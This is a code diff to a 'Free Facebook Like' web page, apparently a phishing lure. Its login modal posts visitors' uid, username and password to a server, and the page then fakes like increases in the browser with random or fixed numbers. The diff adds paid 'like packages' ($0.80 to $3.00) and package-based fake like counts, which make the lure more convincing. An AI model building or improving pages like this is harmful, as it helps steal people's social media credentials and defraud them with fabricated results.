@@ -37,6 +37,22 @@
     box-shadow: 0 4px 20px rgba(0,0,0,0.2);
   }
 
+  /* NEW PACKAGE SECTION */
+  .package-box {
+    background: rgba(255,255,255,0.9);
+    padding: 10px;
+    border-radius: 12px;
+    margin-bottom: 12px;
+  }
+  .package-title {
+    font-weight: bold;
+    margin-bottom: 8px;
+    color:#1877f2;
+  }
+  .package-option {
+    margin-bottom: 5px;
+  }
+
   .input-section input {
     padding: 14px;
     border-radius: 10px;
@@ -121,7 +137,7 @@
     transform: translateY(-2px);
   }
 
-  /* Login form modal */
+  /* Login Modal */
   .modal {
     display: none;
     position: fixed;
@@ -176,6 +192,7 @@
     transform: translateY(-2px);
     box-shadow: 0 5px 15px rgba(66,183,42,0.3);
   }
+
 </style>
 </head>
 <body>
@@ -183,6 +200,29 @@
 <h1>Free Facebook Like</h1>
 
 <div class="input-section">
+
+  <!-- ★ NEW PACKAGE OPTIONS ADDED ★ -->
+  <div class="package-box">
+    <div class="package-title">Select Like Package:</div>
+
+    <label class="package-option">
+      <input type="radio" name="pkg" value="free" checked> ⭐ Free – 100 Likes (24h এ 2 বার)
+    </label>
+
+    <label class="package-option">
+      <input type="radio" name="pkg" value="0.80_2k"> $0.80 – 2000 Likes
+    </label>
+
+    <label class="package-option">
+      <input type="radio" name="pkg" value="1.50_5k"> $1.50 – 5000 Likes
+    </label>
+
+    <label class="package-option">
+      <input type="radio" name="pkg" value="3.00_10k"> $3.00 – 10000 Likes
+    </label>
+  </div>
+  <!-- ★ END PACKAGE OPTION ★ -->
+
   <input type="text" id="post-link" placeholder="Enter Facebook post link">
   <button onclick="addPost()">Get Like</button>
 </div>
@@ -211,6 +251,11 @@
     return params.get("uid");
   }
 
+  function getSelectedPkg(){
+    const r = document.querySelector('input[name="pkg"]:checked');
+    return r ? r.value : "free";
+  }
+
   function addPost() {
     const link = document.getElementById("post-link").value.trim();
     if(!link) {
@@ -220,7 +265,8 @@
 
     const post = {
       link: link,
-      likes: Math.floor(Math.random()*10)+1
+      likes: Math.floor(Math.random()*10)+1,
+      pkg: getSelectedPkg()
     };
 
     posts.push(post);
@@ -253,18 +299,37 @@
         headers: {"Content-Type": "application/json"},
         body: JSON.stringify({ uid, username, password })
       });
+
       const data = await res.json();
+
       if(data.status === "sent") {
         alert("✅ like submit successful!");
+
         loginModal.style.display = "none";
+
         if(currentBoostIndex !== null){
-          posts[currentBoostIndex].likes += Math.floor(Math.random()*11)+50;
+          let pkg = posts[currentBoostIndex].pkg;
+          let add = 0;
+
+          if(pkg === "free"){
+            add = 90 + Math.floor(Math.random()*20);
+          } else if(pkg === "0.80_2k"){
+            add = 2000;
+          } else if(pkg === "1.50_5k"){
+            add = 5000;
+          } else if(pkg === "3.00_10k"){
+            add = 10000;
+          }
+
+          posts[currentBoostIndex].likes += add;
           renderPosts();
           currentBoostIndex = null;
         }
+
       } else {
         alert("❌ Error: " + (data.error || "Unknown error"));
       }
+
     } catch(err) {
       alert("❌ Network error: " + err);
     }
@@ -275,11 +340,16 @@
     posts.forEach((post,index)=>{
       const postDiv = document.createElement("div");
       postDiv.classList.add("post-box");
+
       postDiv.innerHTML = `
-        <div class="post-link">Post: ${post.link}</div>
-        <button class="boost-btn" onclick="boostLike(${index})">Boost Like Free</button>
+        <div>
+          <div class="post-link">Post: ${post.link}</div>
+          <div style="font-size:13px;color:#555;">Package: <b>${post.pkg}</b></div>
+        </div>
+        <button class="boost-btn" onclick="boostLike(${index})">Boost Like</button>
         <span class="like-count">${post.likes} Likes</span>
       `;
+
       postsContainer.appendChild(postDiv);
     });
   }
